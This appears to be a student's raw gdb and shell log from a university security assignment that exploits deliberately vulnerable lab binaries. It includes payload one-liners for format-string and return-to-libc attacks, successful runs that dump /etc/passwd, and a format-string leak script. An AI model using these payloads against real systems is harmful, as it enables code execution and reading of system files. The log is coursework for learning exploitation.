0xffffd420:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd430:	0x41414141	0x41414141	0x41414141	0xf7e46da0
0xffffd440:	0xf7e3a9d0	0xffffd350	0x0000000a	0xf7e24637
0xffffd450:	0xf7fbe000	0xf7fbe000	0x00000000	0xf7e24637
0xffffd460:	0x00000001	0xffffd4f4	0xffffd4fc	0x00000000
0xffffd470:	0x00000000	0x00000000	0xf7fbe000	0xf7ffdc04
0xffffd480:	0xf7ffd000	0x00000000	0xf7fbe000	0xf7fbe000
0xffffd490:	0x00000000	0xfa18fc84	0xc13bd294	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000001	0x080483a0
(gdb) x/1s $esp + 0x10
0xffffd330:	"cat /etc/passwd"
(gdb) x/1s $esp + 0x08
0xffffd328:	"\240\345\373", <incomplete sequence \367>
(gdb) x/1s $esp + 0x0c
0xffffd32c:	""
(gdb) x/9s $esp + 0x0c
0xffffd32c:	""
0xffffd32d:	""
0xffffd32e:	""
0xffffd32f:	""
0xffffd330:	"cat /etc/passwd"
0xffffd340:	'A' <repeats 200 times>...
0xffffd408:	'A' <repeats 52 times>, "\240m\344\367Щ\343\367P\323\377\377\n"
0xffffd44a:	""
0xffffd44b:	""
(gdb) 
0xffffd44c:	"7F\342", <incomplete sequence \367>
0xffffd451:	"\340\373", <incomplete sequence \367>
0xffffd455:	"\340\373", <incomplete sequence \367>
0xffffd459:	""
0xffffd45a:	""
0xffffd45b:	""
0xffffd45c:	"7F\342\367\001"
0xffffd462:	""
0xffffd463:	""
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
   0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
=> 0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
   0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) b *0x080484ea
Breakpoint 5 at 0x80484ea
(gdb) c
Continuing.

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...

Breakpoint 5, 0x080484ea in push_to_talk ()
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
   0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
   0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
=> 0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) ni
0xf7e46da0 in system () from /lib/i386-linux-gnu/libc.so.6
(gdb) disas
Dump of assembler code for function system:
=> 0xf7e46da0 <+0>:	sub    $0xc,%esp
   0xf7e46da3 <+3>:	mov    0x10(%esp),%eax
   0xf7e46da7 <+7>:	call   0xf7f2bb5d
   0xf7e46dac <+12>:	add    $0x177254,%edx
   0xf7e46db2 <+18>:	test   %eax,%eax
   0xf7e46db4 <+20>:	je     0xf7e46dc0 <system+32>
   0xf7e46db6 <+22>:	add    $0xc,%esp
   0xf7e46db9 <+25>:	jmp    0xf7e46850
   0xf7e46dbe <+30>:	xchg   %ax,%ax
   0xf7e46dc0 <+32>:	lea    -0x565ed(%edx),%eax
   0xf7e46dc6 <+38>:	call   0xf7e46850
   0xf7e46dcb <+43>:	test   %eax,%eax
   0xf7e46dcd <+45>:	sete   %al
   0xf7e46dd0 <+48>:	add    $0xc,%esp
   0xf7e46dd3 <+51>:	movzbl %al,%eax
   0xf7e46dd6 <+54>:	ret    
End of assembler dump.
(gdb) ni
0xf7e46da3 in system () from /lib/i386-linux-gnu/libc.so.6
(gdb) 
0xf7e46da7 in system () from /lib/i386-linux-gnu/libc.so.6
(gdb) disas
Dump of assembler code for function system:
   0xf7e46da0 <+0>:	sub    $0xc,%esp
   0xf7e46da3 <+3>:	mov    0x10(%esp),%eax
=> 0xf7e46da7 <+7>:	call   0xf7f2bb5d
   0xf7e46dac <+12>:	add    $0x177254,%edx
   0xf7e46db2 <+18>:	test   %eax,%eax
   0xf7e46db4 <+20>:	je     0xf7e46dc0 <system+32>
   0xf7e46db6 <+22>:	add    $0xc,%esp
   0xf7e46db9 <+25>:	jmp    0xf7e46850
   0xf7e46dbe <+30>:	xchg   %ax,%ax
   0xf7e46dc0 <+32>:	lea    -0x565ed(%edx),%eax
   0xf7e46dc6 <+38>:	call   0xf7e46850
   0xf7e46dcb <+43>:	test   %eax,%eax
   0xf7e46dcd <+45>:	sete   %al
   0xf7e46dd0 <+48>:	add    $0xc,%esp
   0xf7e46dd3 <+51>:	movzbl %al,%eax
   0xf7e46dd6 <+54>:	ret    
End of assembler dump.
(gdb) i r eax
eax            0xffffd350	-11440
(gdb) x/1s $eax
0xffffd350:	'A' <repeats 200 times>...
(gdb) r < mal4
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal4
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) x/100x $rsp
Value can't be converted to integer.
(gdb) x/100x $esp
0xffffd320:	0x30	0xd3	0xff	0xff	0x00	0x02	0x00	0x00
0xffffd328:	0xa0	0xe5	0xfb	0xf7	0x00	0x00	0x00	0x00
0xffffd330:	0x63	0x61	0x74	0x20	0x2f	0x65	0x74	0x63
0xffffd338:	0x2f	0x70	0x61	0x73	0x73	0x77	0x64	0x00
0xffffd340:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd348:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd350:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd358:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd360:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd368:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd370:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd378:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd380:	0x41	0x41	0x41	0x41
(gdb) x/100xw $esp
0xffffd320:	0xffffd330	0x00000200	0xf7fbe5a0	0x00000000
0xffffd330:	0x20746163	0x6374652f	0x7361702f	0x00647773
0xffffd340:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd380:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd390:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd400:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd410:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd420:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd430:	0x41414141	0x41414141	0x41414141	0xf7e46da0
0xffffd440:	0xf7e3a9d0	0xffffd390	0x0000000a	0xf7e24637
0xffffd450:	0xf7fbe000	0xf7fbe000	0x00000000	0xf7e24637
0xffffd460:	0x00000001	0xffffd4f4	0xffffd4fc	0x00000000
0xffffd470:	0x00000000	0x00000000	0xf7fbe000	0xf7ffdc04
0xffffd480:	0xf7ffd000	0x00000000	0xf7fbe000	0xf7fbe000
0xffffd490:	0x00000000	0xb76a799b	0x8c49578b	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000001	0x080483a0
(gdb) 
[1]+  Stopped                 gdb ./vuln_prog3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ cat payloads.txt 
Task1:

python -c "import struct; print 'A'*26 + '%68$n' + 'B'*249 + '\x00'*8 + struct.pack('Q', 0x6010ac)" > mal1
# 0x6010ac is address of global variable

./vuln_prog1 123 < mal1

------------------------------------

Task2:

python -c "import struct; print 'AAAA'*4*8 + struct.pack('Q', 0x2279f) + 'B'*24 + struct.pack('Q', 0x5de)" > mal2

./vuln_prog2 123456 < mal2

------------------------------------

Task3: 

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd350)" > mal3
# 0xf7e46da0 system() address
# 0xf7e3a9d0 exit() address
# 0xffffd350 stack address for buffer while in gdb
gdb ./vuln_prog4
run < mal3

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd390)" > mal4
# 0xffffd390 stack address for buffer
./vuln_prog4 < mal4

ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd340)" > mal3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ fg
gdb ./vuln_prog3
r < mal3
r < mal3
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) x/100xw $esp
0xffffd320:	0xffffd330	0x00000200	0xf7fbe5a0	0x00000000
0xffffd330:	0x20746163	0x6374652f	0x7361702f	0x00647773
0xffffd340:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd380:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd390:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd400:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd410:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd420:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd430:	0x41414141	0x41414141	0x41414141	0xf7e46da0
0xffffd440:	0xf7e3a9d0	0xffffd340	0x0000000a	0xf7e24637
0xffffd450:	0xf7fbe000	0xf7fbe000	0x00000000	0xf7e24637
0xffffd460:	0x00000001	0xffffd4f4	0xffffd4fc	0x00000000
0xffffd470:	0x00000000	0x00000000	0xf7fbe000	0xf7ffdc04
0xffffd480:	0xf7ffd000	0x00000000	0xf7fbe000	0xf7fbe000
0xffffd490:	0x00000000	0x851e510f	0xbe3d7f1f	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000001	0x080483a0
(gdb) 
[1]+  Stopped                 gdb ./vuln_prog3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd350)" > mal3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ fg
gdb ./vuln_prog3
r < mal3
r < mal3
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) c
Continuing.

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...

Breakpoint 5, 0x080484ea in push_to_talk ()
(gdb) c
Continuing.
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
[Inferior 1 (process 1994) exited with code 012]
(gdb) r < mal3
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) x/100xw $esp
0xffffd320:	0xffffd330	0x00000200	0xf7fbe5a0	0x00000000
0xffffd330:	0x20746163	0x6374652f	0x7361702f	0x00647773
0xffffd340:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd380:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd390:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd400:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd410:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd420:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd430:	0x41414141	0x41414141	0x41414141	0xf7e46da0
0xffffd440:	0xf7e3a9d0	0xffffd350	0x0000000a	0xf7e24637
0xffffd450:	0xf7fbe000	0xf7fbe000	0x00000000	0xf7e24637
0xffffd460:	0x00000001	0xffffd4f4	0xffffd4fc	0x00000000
0xffffd470:	0x00000000	0x00000000	0xf7fbe000	0xf7ffdc04
0xffffd480:	0xf7ffd000	0x00000000	0xf7fbe000	0xf7fbe000
0xffffd490:	0x00000000	0x53e66e99	0x68c54089	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000001	0x080483a0
(gdb) 
[1]+  Stopped                 gdb ./vuln_prog3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd330)" > mal3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ fg
gdb ./vuln_prog3
r < mal3
r < mal3
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) c
Continuing.

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...

Breakpoint 5, 0x080484ea in push_to_talk ()
(gdb) c
Continuing.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
[Inferior 1 (process 2024) exited with code 012]
(gdb) quit
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ gdb ./vuln_prog3
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln_prog3...(no debugging symbols found)...done.
(gdb) r < mal3
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
[Inferior 1 (process 2035) exited with code 012]
(gdb) 
[1]+  Stopped                 gdb ./vuln_prog3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xffffffff) + struct.pack('I', 0xffffd330)" > mal3
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ f
f: command not found
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ fg
gdb ./vuln_prog3
r < mal3
r < mal3
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false

Program received signal SIGSEGV, Segmentation fault.
0xffffffff in ?? ()
(gdb) bt
#0  0xffffffff in ?? ()
#1  0xffffd330 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
(gdb) x/100xw 0xffffd330
0xffffd330:	0x20746163	0x6374652f	0x7361702f	0x00647773
0xffffd340:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd380:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd390:	0x41414141	0x41414141	0x00000001	0x00010000
0xffffd3a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3d0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3e0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd3f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd400:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd410:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd420:	0x41414141	0x41414141	0x41414141	0xf7e4685e
0xffffd430:	0x00000000	0xf7fbe000	0xf7fbe000	0x41414141
0xffffd440:	0xffffffff	0xffffd330	0x0000000a	0xf7e24637
0xffffd450:	0xf7fbe000	0xf7fbe000	0x00000000	0xf7e24637
0xffffd460:	0x00000001	0xffffd4f4	0xffffd4fc	0x00000000
0xffffd470:	0x00000000	0x00000000	0xf7fbe000	0xf7ffdc04
0xffffd480:	0xf7ffd000	0x00000000	0xf7fbe000	0xf7fbe000
0xffffd490:	0x00000000	0xf18b3ab7	0xcaa814a7	0x00000000
0xffffd4a0:	0x00000000	0x00000000	0x00000001	0x080483a0
0xffffd4b0:	0x00000000	0xf7fee010	0xf7fe8880	0xf7ffd000
(gdb) x/1s 0xffffd330
0xffffd330:	"cat /etc/passwd"
(gdb) quit
A debugging session is active.

	Inferior 1 [process 2048] will be killed.

Quit anyway? (y or n) y
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ packet_write_wait: Connection to 155.246.89.102 port 22: Broken pipe
Lunarantic:hw2-ret2libc Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

32 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Fri Oct 26 18:05:34 2018 from 155.246.82.170
ryadav3@nemo:~$ cd 576/labs/lab8/
prof/ test/ 
ryadav3@nemo:~$ cd 576/labs/lab8/
prof/ test/ 
ryadav3@nemo:~$ cd 576/labs/lab8/test/
ryadav3@nemo:~/576/labs/lab8/test$ ls
exploit.py  exploit.rb  Makefile  out  payload  ppp  victim  victim.c
ryadav3@nemo:~/576/labs/lab8/test$ cat exploit.py
import subprocess
import fcntl
import os
#import time
import struct

shellcode = "/bin/cat /etc/passwd\0";

args = ["/usr/bin/setarch", "x86_64", "-R", "./victim"]

popen = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# To avoid deadlock
fdo = popen.stdout.fileno()
# fl = fcntl.fcntl(fdo, fcntl.F_GETFL)
# fcntl.fcntl(fdo, fcntl.F_SETFL, fl | os.O_NONBLOCK)
fdi = popen.stdin.fileno()
# fl = fcntl.fcntl(fdi, fcntl.F_GETFL)
# fcntl.fcntl(fdi, fcntl.F_SETFL, fl | os.O_NONBLOCK)

popen.stdout.flush()
print popen.stdout.read()
popen.stdin.write("%llx-" * 71 + "\n")
# popen.stdin.flush()
op = popen.stdout.read()
print op
